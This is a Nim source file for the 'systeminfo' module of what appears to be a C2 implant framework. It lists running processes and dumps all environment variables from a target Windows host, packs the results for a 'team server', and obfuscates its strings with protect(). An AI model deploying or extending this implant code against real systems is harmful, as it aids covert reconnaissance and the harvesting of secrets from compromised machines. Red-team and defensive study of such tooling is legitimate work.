import ../common/[types, utils]

# Declare function prototypes
proc executePs(ctx: AgentCtx, task: Task): TaskResult
proc executeEnv(ctx: AgentCtx, task: Task): TaskResult

# Module definition
let module* = Module(
    name: protect("systeminfo"),
    description: protect("Retrieve information about the target system and environment."),
    moduleType: MODULE_SITUATIONAL_AWARENESS,
    commands: @[
        Command(
            name: protect("ps"),
            commandType: CMD_PS,
            description: protect("Display running processes."),
            example: protect("ps"),
            arguments: @[],
            execute: executePs
        ),
        Command(
            name: protect("env"),
            commandType: CMD_ENV,
            description: protect("Display environment variables."),
            example: protect("env"),
            arguments: @[],
            execute: executeEnv
        )
    ]
)

# Implement execution functions
when not defined(agent):
    proc executePs(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent): 

    import winim
    import os, strutils, strformat, tables, algorithm
    import ../agent/utils/io
    import ../agent/protocol/result
    import ../agent/core/process
    import ../common/serialize

    proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
    
        print "   [>] Listing running processes."
        
        try: 
            var processes: string = ""            
            var packer = Packer.init() 

            let procList = processList() 
            
            # Add process data to send to the team server
            packer.add(cast[uint32](procList.len()))    
            for procInfo in procList: 
                packer
                    .add(cast[uint32](procInfo.pid))                            # [PID]: 4 bytes 
                    .add(cast[uint32](procInfo.ppid))                           # [PPID]: 4 bytes 
                    .addDataWithLengthPrefix(string.toBytes(procInfo.name))     # [Process name]: Variable 
                    .addDataWithLengthPrefix(string.toBytes(procInfo.user))     # [Process user]: Variable
                    .add(cast[uint32](procInfo.session))                        # [Session]: 4 bytes

            return createTaskResult(task, STATUS_COMPLETED, RESULT_PROCESSES, packer.pack())

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = 

        print "   [>] Displaying environment variables."

        try: 
            var output: string = ""
            for key, value in envPairs(): 
               output &= fmt"{key}: {value}" & '\n'
               
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))